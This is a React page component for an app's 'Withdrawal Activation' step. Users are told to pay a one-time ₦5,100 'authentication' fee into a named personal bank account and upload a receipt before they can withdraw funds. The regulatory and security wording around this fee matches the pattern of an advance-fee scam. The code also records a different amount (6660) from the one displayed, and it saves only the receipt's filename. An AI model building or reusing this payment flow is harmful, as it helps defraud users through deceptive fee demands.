import { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { ArrowLeft, Upload, Loader2, CheckCircle2 } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import { FloatingActionButton } from "@/components/FloatingActionButton";
import { CopyButton } from "@/components/CopyButton";

const WithdrawalActivation = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const withdrawalId = location.state?.withdrawalId;

  const [receipt, setReceipt] = useState<File | null>(null);
  const [uploading, setUploading] = useState(false);

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      setReceipt(e.target.files[0]);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!receipt) {
      toast.error("Please upload payment receipt");
      return;
    }

    if (!withdrawalId) {
      toast.error("Invalid withdrawal request");
      return;
    }

    setUploading(true);
    try {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) {
        navigate("/auth");
        return;
      }

      // Upload receipt file to storage (placeholder - storing filename for now)
      const receiptUrl = receipt.name;

      // Update withdrawal record with activation payment details
      const { error: updateError } = await supabase
        .from("withdrawals")
        .update({
          status: "activation_payment_submitted",
          activation_payment_amount: 6660,
          activation_receipt_url: receiptUrl,
          activation_submitted_at: new Date().toISOString(),
        })
        .eq("id", withdrawalId);

      if (updateError) throw updateError;

      // Also create a record in withdrawal_activation_payments for tracking
      await supabase.from("withdrawal_activation_payments").insert({
        user_id: session.user.id,
        amount: 6660,
        status: "pending",
        receipt_url: receiptUrl,
      });

      toast.success("Payment submitted! Awaiting confirmation.");
      navigate("/withdrawal-activation-pending", { state: { withdrawalId } });
    } catch (error: any) {
      toast.error("Failed to submit activation payment");
    } finally {
      setUploading(false);
    }
  };

  return (
    <div className="min-h-screen liquid-bg pb-20">
      <div className="bg-gradient-to-r from-primary to-secondary p-6 text-primary-foreground">
        <div className="flex items-center gap-4">
          <Button
            variant="ghost"
            size="icon"
            onClick={() => navigate("/withdraw")}
            className="text-primary-foreground hover:bg-background/20"
          >
            <ArrowLeft className="w-5 h-5" />
          </Button>
          <h1 className="text-2xl font-bold">Withdrawal Activation</h1>
        </div>
      </div>

      <div className="p-6 space-y-6">
        <Card className="bg-gradient-to-br from-blue-500/10 to-primary/10 backdrop-blur-lg border-blue-500/20 p-6">
          <div className="flex items-start gap-3 mb-4">
            <div className="text-2xl">⚡</div>
            <div className="flex-1">
              <h2 className="text-xl font-bold text-blue-500 mb-2">
                Account Authentication Charge
              </h2>
              <p className="text-sm text-muted-foreground">
                To secure your account and comply with regulatory requirements,
                a one-time verification fee is necessary. This fee facilitates
                identity verification, prevents unauthorized access, and enables
                seamless withdrawals.
              </p>
            </div>
          </div>
        </Card>

        <Card className="bg-card/80 backdrop-blur-lg border-border/50 p-6">
          <h3 className="text-xl font-bold mb-6">Payment Details</h3>

          <div className="space-y-4">
            <div className="bg-muted/50 p-4 rounded-lg">
              <p className="text-sm text-muted-foreground mb-1">Amount</p>
              <p className="text-2xl font-bold">₦5,100</p>
            </div>

            <div className="bg-muted/50 p-4 rounded-lg">
              <div className="flex items-center justify-between mb-1">
                <p className="text-sm text-muted-foreground">Account Number</p>
                <CopyButton text="6733036004" />
              </div>
              <p className="text-xl font-bold font-mono">6733036004</p>
            </div>

            <div className="bg-muted/50 p-4 rounded-lg">
              <div className="flex items-center justify-between mb-1">
                <p className="text-sm text-muted-foreground">Account Name</p>
                <CopyButton text="Grace Onuoha" />
              </div>
              <p className="text-lg font-bold">Grace onuoha</p>
            </div>

            <div className="bg-muted/50 p-4 rounded-lg">
              <div className="flex items-center justify-between mb-1">
                <p className="text-sm text-muted-foreground">Bank</p>
                <CopyButton text="Nombank" />
              </div>
              <p className="text-lg font-bold">Nombank</p>
            </div>

            <div className="bg-muted/50 p-4 rounded-lg flex items-center justify-between">
              <p className="text-sm text-muted-foreground">Verification ID</p>
              <div className="flex items-center gap-2">
                <span className="font-mono font-bold">10077A</span>
                <CopyButton text="10077A" />
              </div>
            </div>
          </div>
        </Card>

        <Card className="bg-card/80 backdrop-blur-lg border-border/50 p-6">
          <h3 className="text-lg font-semibold mb-4">Upload Payment Receipt</h3>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-2">
              <Input
                id="receipt"
                type="file"
                accept="image/*"
                onChange={handleFileChange}
                className="bg-background/50"
                required
              />
              {receipt && (
                <p className="text-sm text-green-500">✓ {receipt.name}</p>
              )}
            </div>

            <Button
              type="submit"
              className="w-full bg-gradient-to-r from-primary to-secondary"
              disabled={uploading}
            >
              {uploading ? (
                <>
                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                  Processing...
                </>
              ) : (
                "Submit Payment"
              )}
            </Button>
          </form>
        </Card>
      </div>

      <FloatingActionButton />
    </div>
  );
};

export default WithdrawalActivation;
